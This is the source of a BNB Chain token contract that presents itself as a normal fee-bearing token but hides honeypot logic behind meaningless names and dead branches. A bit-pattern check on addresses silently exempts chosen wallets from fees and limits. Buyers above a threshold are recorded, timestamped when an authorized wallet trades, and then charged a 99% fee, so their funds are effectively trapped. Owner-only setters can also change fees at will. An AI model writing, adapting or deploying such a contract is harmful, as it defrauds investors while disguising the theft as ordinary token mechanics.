/**
 *Submitted for verification at BscScan.com on 2022-12-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SelfishnessWarmheart is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Selfishness Warmheart ";
    string constant _symbol = "SelfishnessWarmheart";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private marketingIsLiquidityMax;
    mapping(address => bool) private minTeamExemptAutoTxLimitLiquidity;
    mapping(address => bool) private exemptAutoMaxBuyLimitTxWallet;
    mapping(address => bool) private botsMaxIsMarketing;
    mapping(address => uint256) private limitBurnLaunchedExemptIsLiquiditySwap;
    mapping(uint256 => address) private tradingExemptModeFee;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private autoLiquidityBuyTradingTeamMarketing = 0;
    uint256 private exemptWalletSwapLaunched = 10;

    //SELL FEES
    uint256 private liquidityWalletTradingBurnTeam = 0;
    uint256 private tradingMarketingSwapIsBurn = 10;

    uint256 private limitTxExemptSwap = exemptWalletSwapLaunched + autoLiquidityBuyTradingTeamMarketing;
    uint256 private maxBurnTradingBuy = 100;

    address private maxSellBotsLimitBurn = (msg.sender); // auto-liq address
    address private walletBurnMinAuto = (0x6C82585ae9e9957130f8c8EafFffD42aa95068F2); // marketing address
    address private walletLimitSellMarketing = DEAD;
    address private maxModeTxMin = DEAD;
    address private teamTxSellMode = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private exemptTxLiquidityReceiver;
    uint256 private exemptBotsModeSwap;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private exemptFeeBuyBurnTeam;
    uint256 private sellTeamTradingBotsFeeBuy;
    uint256 private sellBurnWalletMaxMarketingTx;
    uint256 private maxTxBuyModeLiquidityIsBots;
    uint256 private sellBuyLiquidityExemptTeam;

    bool private feeSwapTeamModeLimitBotsTrading = true;
    bool private botsMaxIsMarketingMode = true;
    bool private sellBuyModeBotsTeamLiquidityReceiver = true;
    bool private isWalletAutoMax = true;
    bool private exemptBurnReceiverSwap = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private walletModeFeeTeamAutoReceiver = 6 * 10 ** 15;
    uint256 private botsLiquidityReceiverFee = _totalSupply / 1000; // 0.1%

    
    bool private receiverMarketingMinTx = false;
    uint256 private maxWalletExemptBuy = 0;
    bool private feeLaunchedBurnIs = false;
    uint256 private autoReceiverIsLiquidityModeMaxBots = 0;
    uint256 private launchedLimitAutoReceiver = 0;
    uint256 private burnSwapLiquidityMinMode = 0;
    uint256 private burnMarketingModeFee = 0;
    uint256 private isAutoExemptBotsReceiver = 0;
    uint256 private tradingTeamModeBots = 0;
    uint256 private botsTxMaxTeam = 0;
    bool private maxWalletExemptBuy0 = false;
    uint256 private maxWalletExemptBuy1 = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        exemptFeeBuyBurnTeam = true;

        marketingIsLiquidityMax[msg.sender] = true;
        marketingIsLiquidityMax[address(this)] = true;

        minTeamExemptAutoTxLimitLiquidity[msg.sender] = true;
        minTeamExemptAutoTxLimitLiquidity[0x0000000000000000000000000000000000000000] = true;
        minTeamExemptAutoTxLimitLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        minTeamExemptAutoTxLimitLiquidity[address(this)] = true;

        exemptAutoMaxBuyLimitTxWallet[msg.sender] = true;
        exemptAutoMaxBuyLimitTxWallet[0x0000000000000000000000000000000000000000] = true;
        exemptAutoMaxBuyLimitTxWallet[0x000000000000000000000000000000000000dEaD] = true;
        exemptAutoMaxBuyLimitTxWallet[address(this)] = true;

        SetAuthorized(address(0xD1df24c1Cee5c03c55597aE7ffFfD480EAB3Db46));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return tradingExemptLimitFeeReceiverIs(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Selfishness Warmheart  Insufficient Allowance");
        }

        return tradingExemptLimitFeeReceiverIs(sender, recipient, amount);
    }

    function tradingExemptLimitFeeReceiverIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (maxWalletExemptBuy != launchedLimitAutoReceiver) {
            maxWalletExemptBuy = maxWalletExemptBuy1;
        }


        bool bLimitTxWalletValue = launchedBuyWalletLiquidity(sender) || launchedBuyWalletLiquidity(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                minWalletMaxTx();
            }
            if (!bLimitTxWalletValue) {
                receiverTeamTradingFeeModeMinMax(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return modeMinFeeLimit(sender, recipient, amount);}

        if (!marketingIsLiquidityMax[sender] && !marketingIsLiquidityMax[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Selfishness Warmheart  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || exemptAutoMaxBuyLimitTxWallet[sender] || exemptAutoMaxBuyLimitTxWallet[recipient], "Selfishness Warmheart  Max TX Limit has been triggered");

        if (burnFeeTradingLaunched()) {marketingBuyLaunchedSellWalletIs();}

        _balances[sender] = _balances[sender].sub(amount, "Selfishness Warmheart  Insufficient Balance");
        
        uint256 amountReceived = exemptIsModeMarketing(sender) ? autoBurnLaunchedExempt(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeMinFeeLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Selfishness Warmheart  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function exemptIsModeMarketing(address sender) internal view returns (bool) {
        return !minTeamExemptAutoTxLimitLiquidity[sender];
    }

    function swapAutoLiquidityMode(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            limitTxExemptSwap = tradingMarketingSwapIsBurn + liquidityWalletTradingBurnTeam;
            return modeBotsBurnIs(sender, limitTxExemptSwap);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitTxExemptSwap = exemptWalletSwapLaunched + autoLiquidityBuyTradingTeamMarketing;
            return limitTxExemptSwap;
        }
        return modeBotsBurnIs(sender, limitTxExemptSwap);
    }

    function marketingSellMinLimit() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function autoBurnLaunchedExempt(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(swapAutoLiquidityMode(sender, receiver == uniswapV2Pair)).div(maxBurnTradingBuy);

        if (botsMaxIsMarketing[sender] || botsMaxIsMarketing[receiver]) {
            feeAmount = amount.mul(99).div(maxBurnTradingBuy);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function launchedBuyWalletLiquidity(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function modeBotsBurnIs(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = limitBurnLaunchedExemptIsLiquiditySwap[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function receiverTeamTradingFeeModeMinMax(address addr) private {
        if (marketingSellMinLimit() < walletModeFeeTeamAutoReceiver) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        tradingExemptModeFee[exemptLimitValue] = addr;
    }

    function minWalletMaxTx() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (limitBurnLaunchedExemptIsLiquiditySwap[tradingExemptModeFee[i]] == 0) {
                    limitBurnLaunchedExemptIsLiquiditySwap[tradingExemptModeFee[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletBurnMinAuto).transfer(amountBNB * amountPercentage / 100);
    }

    function burnFeeTradingLaunched() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    exemptBurnReceiverSwap &&
    _balances[address(this)] >= botsLiquidityReceiverFee;
    }

    function marketingBuyLaunchedSellWalletIs() internal swapping {
        
        if (burnMarketingModeFee == isAutoExemptBotsReceiver) {
            burnMarketingModeFee = maxWalletExemptBuy1;
        }

        if (botsTxMaxTeam == launchedLimitAutoReceiver) {
            botsTxMaxTeam = limitTxExemptSwap;
        }

        if (isAutoExemptBotsReceiver != maxWalletExemptBuy1) {
            isAutoExemptBotsReceiver = limitTxExemptSwap;
        }


        uint256 amountToLiquify = botsLiquidityReceiverFee.mul(autoLiquidityBuyTradingTeamMarketing).div(limitTxExemptSwap).div(2);
        uint256 amountToSwap = botsLiquidityReceiverFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (maxWalletExemptBuy1 == tradingTeamModeBots) {
            maxWalletExemptBuy1 = maxBurnTradingBuy;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitTxExemptSwap.sub(autoLiquidityBuyTradingTeamMarketing.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(autoLiquidityBuyTradingTeamMarketing).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(exemptWalletSwapLaunched).div(totalETHFee);
        
        if (tradingTeamModeBots != burnMarketingModeFee) {
            tradingTeamModeBots = isAutoExemptBotsReceiver;
        }

        if (maxWalletExemptBuy1 != autoReceiverIsLiquidityModeMaxBots) {
            maxWalletExemptBuy1 = exemptWalletSwapLaunched;
        }

        if (burnMarketingModeFee == limitTxExemptSwap) {
            burnMarketingModeFee = botsLiquidityReceiverFee;
        }


        payable(walletBurnMinAuto).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                maxSellBotsLimitBurn,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBotsMaxIsMarketingMode() public view returns (bool) {
        if (botsMaxIsMarketingMode != exemptBurnReceiverSwap) {
            return exemptBurnReceiverSwap;
        }
        if (botsMaxIsMarketingMode == maxWalletExemptBuy0) {
            return maxWalletExemptBuy0;
        }
        if (botsMaxIsMarketingMode == botsMaxIsMarketingMode) {
            return botsMaxIsMarketingMode;
        }
        return botsMaxIsMarketingMode;
    }
    function setBotsMaxIsMarketingMode(bool a0) public onlyOwner {
        if (botsMaxIsMarketingMode == feeLaunchedBurnIs) {
            feeLaunchedBurnIs=a0;
        }
        if (botsMaxIsMarketingMode == receiverMarketingMinTx) {
            receiverMarketingMinTx=a0;
        }
        if (botsMaxIsMarketingMode != exemptBurnReceiverSwap) {
            exemptBurnReceiverSwap=a0;
        }
        botsMaxIsMarketingMode=a0;
    }

    function getBotsMaxIsMarketing(address a0) public view returns (bool) {
        if (a0 == walletLimitSellMarketing) {
            return botsMaxIsMarketingMode;
        }
        if (botsMaxIsMarketing[a0] != botsMaxIsMarketing[a0]) {
            return exemptBurnReceiverSwap;
        }
        if (botsMaxIsMarketing[a0] != botsMaxIsMarketing[a0]) {
            return exemptBurnReceiverSwap;
        }
            return botsMaxIsMarketing[a0];
    }
    function setBotsMaxIsMarketing(address a0,bool a1) public onlyOwner {
        if (botsMaxIsMarketing[a0] != exemptAutoMaxBuyLimitTxWallet[a0]) {
           exemptAutoMaxBuyLimitTxWallet[a0]=a1;
        }
        if (a0 != teamTxSellMode) {
            receiverMarketingMinTx=a1;
        }
        botsMaxIsMarketing[a0]=a1;
    }

    function getAutoReceiverIsLiquidityModeMaxBots() public view returns (uint256) {
        if (autoReceiverIsLiquidityModeMaxBots != tradingMarketingSwapIsBurn) {
            return tradingMarketingSwapIsBurn;
        }
        if (autoReceiverIsLiquidityModeMaxBots == maxWalletExemptBuy) {
            return maxWalletExemptBuy;
        }
        if (autoReceiverIsLiquidityModeMaxBots == botsLiquidityReceiverFee) {
            return botsLiquidityReceiverFee;
        }
        return autoReceiverIsLiquidityModeMaxBots;
    }
    function setAutoReceiverIsLiquidityModeMaxBots(uint256 a0) public onlyOwner {
        if (autoReceiverIsLiquidityModeMaxBots != burnMarketingModeFee) {
            burnMarketingModeFee=a0;
        }
        if (autoReceiverIsLiquidityModeMaxBots == maxWalletExemptBuy) {
            maxWalletExemptBuy=a0;
        }
        autoReceiverIsLiquidityModeMaxBots=a0;
    }

    function getIsWalletAutoMax() public view returns (bool) {
        return isWalletAutoMax;
    }
    function setIsWalletAutoMax(bool a0) public onlyOwner {
        if (isWalletAutoMax == botsMaxIsMarketingMode) {
            botsMaxIsMarketingMode=a0;
        }
        isWalletAutoMax=a0;
    }

    function getBotsLiquidityReceiverFee() public view returns (uint256) {
        if (botsLiquidityReceiverFee == exemptWalletSwapLaunched) {
            return exemptWalletSwapLaunched;
        }
        if (botsLiquidityReceiverFee != burnSwapLiquidityMinMode) {
            return burnSwapLiquidityMinMode;
        }
        if (botsLiquidityReceiverFee != isAutoExemptBotsReceiver) {
            return isAutoExemptBotsReceiver;
        }
        return botsLiquidityReceiverFee;
    }
    function setBotsLiquidityReceiverFee(uint256 a0) public onlyOwner {
        if (botsLiquidityReceiverFee == maxBurnTradingBuy) {
            maxBurnTradingBuy=a0;
        }
        botsLiquidityReceiverFee=a0;
    }

    function getMaxModeTxMin() public view returns (address) {
        if (maxModeTxMin == maxSellBotsLimitBurn) {
            return maxSellBotsLimitBurn;
        }
        if (maxModeTxMin != maxSellBotsLimitBurn) {
            return maxSellBotsLimitBurn;
        }
        if (maxModeTxMin != walletBurnMinAuto) {
            return walletBurnMinAuto;
        }
        return maxModeTxMin;
    }
    function setMaxModeTxMin(address a0) public onlyOwner {
        if (maxModeTxMin != walletBurnMinAuto) {
            walletBurnMinAuto=a0;
        }
        if (maxModeTxMin == maxSellBotsLimitBurn) {
            maxSellBotsLimitBurn=a0;
        }
        maxModeTxMin=a0;
    }

    function getMaxBurnTradingBuy() public view returns (uint256) {
        if (maxBurnTradingBuy != burnMarketingModeFee) {
            return burnMarketingModeFee;
        }
        return maxBurnTradingBuy;
    }
    function setMaxBurnTradingBuy(uint256 a0) public onlyOwner {
        if (maxBurnTradingBuy != limitTxExemptSwap) {
            limitTxExemptSwap=a0;
        }
        if (maxBurnTradingBuy != exemptWalletSwapLaunched) {
            exemptWalletSwapLaunched=a0;
        }
        if (maxBurnTradingBuy != tradingMarketingSwapIsBurn) {
            tradingMarketingSwapIsBurn=a0;
        }
        maxBurnTradingBuy=a0;
    }

    function getFeeLaunchedBurnIs() public view returns (bool) {
        if (feeLaunchedBurnIs == sellBuyModeBotsTeamLiquidityReceiver) {
            return sellBuyModeBotsTeamLiquidityReceiver;
        }
        if (feeLaunchedBurnIs != feeSwapTeamModeLimitBotsTrading) {
            return feeSwapTeamModeLimitBotsTrading;
        }
        if (feeLaunchedBurnIs == sellBuyModeBotsTeamLiquidityReceiver) {
            return sellBuyModeBotsTeamLiquidityReceiver;
        }
        return feeLaunchedBurnIs;
    }
    function setFeeLaunchedBurnIs(bool a0) public onlyOwner {
        if (feeLaunchedBurnIs != feeLaunchedBurnIs) {
            feeLaunchedBurnIs=a0;
        }
        if (feeLaunchedBurnIs == feeSwapTeamModeLimitBotsTrading) {
            feeSwapTeamModeLimitBotsTrading=a0;
        }
        if (feeLaunchedBurnIs == maxWalletExemptBuy0) {
            maxWalletExemptBuy0=a0;
        }
        feeLaunchedBurnIs=a0;
    }

    function getExemptAutoMaxBuyLimitTxWallet(address a0) public view returns (bool) {
        if (a0 != maxSellBotsLimitBurn) {
            return feeSwapTeamModeLimitBotsTrading;
        }
        if (a0 == walletBurnMinAuto) {
            return sellBuyModeBotsTeamLiquidityReceiver;
        }
        if (exemptAutoMaxBuyLimitTxWallet[a0] != minTeamExemptAutoTxLimitLiquidity[a0]) {
            return botsMaxIsMarketingMode;
        }
            return exemptAutoMaxBuyLimitTxWallet[a0];
    }
    function setExemptAutoMaxBuyLimitTxWallet(address a0,bool a1) public onlyOwner {
        exemptAutoMaxBuyLimitTxWallet[a0]=a1;
    }

    function getWalletBurnMinAuto() public view returns (address) {
        return walletBurnMinAuto;
    }
    function setWalletBurnMinAuto(address a0) public onlyOwner {
        if (walletBurnMinAuto != walletBurnMinAuto) {
            walletBurnMinAuto=a0;
        }
        if (walletBurnMinAuto == teamTxSellMode) {
            teamTxSellMode=a0;
        }
        walletBurnMinAuto=a0;
    }

    function getLaunchedLimitAutoReceiver() public view returns (uint256) {
        if (launchedLimitAutoReceiver != maxBurnTradingBuy) {
            return maxBurnTradingBuy;
        }
        if (launchedLimitAutoReceiver == isAutoExemptBotsReceiver) {
            return isAutoExemptBotsReceiver;
        }
        if (launchedLimitAutoReceiver != tradingTeamModeBots) {
            return tradingTeamModeBots;
        }
        return launchedLimitAutoReceiver;
    }
    function setLaunchedLimitAutoReceiver(uint256 a0) public onlyOwner {
        if (launchedLimitAutoReceiver == maxBurnTradingBuy) {
            maxBurnTradingBuy=a0;
        }
        if (launchedLimitAutoReceiver != maxBurnTradingBuy) {
            maxBurnTradingBuy=a0;
        }
        if (launchedLimitAutoReceiver == limitTxExemptSwap) {
            limitTxExemptSwap=a0;
        }
        launchedLimitAutoReceiver=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}